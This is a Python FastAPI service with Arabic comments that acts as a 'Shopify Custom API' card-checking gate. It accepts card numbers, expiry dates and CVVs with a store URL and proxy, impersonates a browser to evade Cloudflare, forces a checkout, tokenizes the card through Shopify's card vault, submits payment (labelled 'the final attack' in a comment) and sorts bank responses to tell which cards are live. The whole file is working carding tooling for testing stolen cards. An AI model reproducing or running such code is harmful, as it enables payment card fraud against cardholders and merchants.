from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from curl_cffi.requests import AsyncSession
import re
import json
import asyncio

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    elif len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    return proxy_str if proxy_str.startswith('http') else f"http://{proxy_str}"

def extract_token(html):
    """رادار متطور للبحث عن رمز الأمان في كل زوايا شوبي فاي"""
    patterns = [
        r'name="authenticity_token"\s+value="([^"]+)"',
        r'value="([^"]+)"\s+name="authenticity_token"',
        r'<meta\s+name="csrf-token"\s+content="([^"]+)"',
        r'name="authenticity_token"\s+type="hidden"\s+value="([^"]+)"',
        r'"authenticity_token"\s*:\s*"([^"]+)"'
    ]
    for p in patterns:
        match = re.search(p, html)
        if match:
            return match.group(1)
    return None

async def check_shopify(cc_info, store_url, proxy):
    try:
        # تفكيك البطاقة
        cc_parts = re.findall(r'\d+', cc_info.replace('|', ' '))
        if len(cc_parts) < 4: return {"Response": "Invalid CC Format", "Price": "-", "Gate": "Shopify Custom API"}
        cc, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = store_url.rstrip('/')
        formatted_proxy = format_proxy(proxy)
        proxies = {"http": formatted_proxy, "https": formatted_proxy} if formatted_proxy else None

        # متصفح شبحي لتخطي كلاودفلير
        async with AsyncSession(impersonate="chrome120", proxies=proxies, timeout=45) as session:
            
            # 1. سحب المنتج
            prod_url = f"{store_url}/products.json?limit=1"
            res1 = await session.get(prod_url)
            if res1.status_code != 200: 
                return {"Response": f"Site Dead or Blocked (HTTP {res1.status_code})", "Price": "-", "Gate": "Shopify Custom API"}
            
            prod_data = res1.json()
            variant_id = prod_data['products'][0]['variants'][0]['id']
            price = prod_data['products'][0]['variants'][0]['price']

            # 2. الإضافة للسلة (مع إجبار شوبي فاي على قبوله كطلب AJAX حقيقي)
            add_url = f"{store_url}/cart/add.js"
            add_data = {"id": str(variant_id), "quantity": "1"}
            res2 = await session.post(add_url, data=add_data, headers={"X-Requested-With": "XMLHttpRequest"})
            if res2.status_code != 200: 
                return {"Response": "Cart Add Failed", "Price": str(price), "Gate": "Shopify Custom API"}

            # 3. إجبار الموقع على فتح صفحة الدفع (Force Checkout)
            cart_url = f"{store_url}/cart"
            res3 = await session.post(cart_url, data={"checkout": "Checkout"}, allow_redirects=True)
            checkout_html = res3.text
            checkout_final_url = str(res3.url)
            
            # 4. استخراج رمز الأمان (Token)
            auth_token = extract_token(checkout_html)

            # استشعار الخطأ في حال فشل استخراج الرمز لمعرفة السبب الدقيق
            if not auth_token:
                title_match = re.search(r'<title>([^<]+)</title>', checkout_html)
                page_title = title_match.group(1).strip() if title_match else "Unknown Page"
                if "Just a moment" in page_title or "Cloudflare" in page_title:
                    return {"Response": "Cloudflare Challenge Blocked the Proxy", "Price": str(price), "Gate": "Shopify Custom API"}
                return {"Response": f"Token Not Found. Landed on: {page_title[:20]}", "Price": str(price), "Gate": "Shopify Custom API"}

            # 5. تشفير البطاقة داخل سيرفرات شوبي فاي
            token_url = "https://deposit.us.shopifycs.com/sessions"
            token_payload = {"credit_card": {"number": cc, "name": "John Doe", "month": mm, "year": yy, "verification_value": cvv}}
            
            res4 = await session.post(token_url, json=token_payload)
            if res4.status_code != 200: 
                return {"Response": "Failed to tokenize card (Proxy IP Banned)", "Price": str(price), "Gate": "Shopify Custom API"}
            
            token_data = res4.json()
            payment_token = token_data.get("id")

            # 6. الهجوم النهائي (إرسال الدفع)
            payment_payload = {
                "authenticity_token": auth_token,
                "previous_step": "payment_method",
                "step": "",
                "s": payment_token,
                "checkout[payment_gateway]": "1", 
                "checkout[credit_card][vault]": "false",
                "checkout[different_billing_address]": "false",
                "complete": "1"
            }
            
            res5 = await session.post(checkout_final_url, data=payment_payload)
            result_html = res5.text.lower()
            
            # 7. قراءة رد البنك
            if "thank you" in result_html or "order completed" in result_html or res5.url.endswith('/thank_you'):
                return {"Response": "Order completed 💎", "Price": str(price), "Gate": "Shopify Custom API"}
            elif "insufficient funds" in result_html: return {"Response": "Insufficient Funds", "Price": str(price), "Gate": "Shopify Custom API"}
            elif "incorrect_cvc" in result_html or "security code was not matched" in result_html: return {"Response": "Incorrect CVC", "Price": str(price), "Gate": "Shopify Custom API"}
            elif "zip code does not match" in result_html or "avs" in result_html: return {"Response": "ZIP Code Mismatch", "Price": str(price), "Gate": "Shopify Custom API"}
            elif "do not honor" in result_html or "generic_decline" in result_html: return {"Response": "Do Not Honor", "Price": str(price), "Gate": "Shopify Custom API"}
            else:
                error_match = re.search(r'class="field__message field__message--error">([^<]+)<', res5.text)
                if error_match: return {"Response": error_match.group(1).strip(), "Price": str(price), "Gate": "Shopify Custom API"}
                return {"Response": "Declined / Generic Error", "Price": str(price), "Gate": "Shopify Custom API"}

    except Exception as e:
        return {"Response": f"API Timeout or Connection Error", "Price": "-", "Gate": "Shopify Custom API"}

@app.get("/code/index.php")
async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    result = await check_shopify(cc, url, proxy)
    return JSONResponse(content=result)
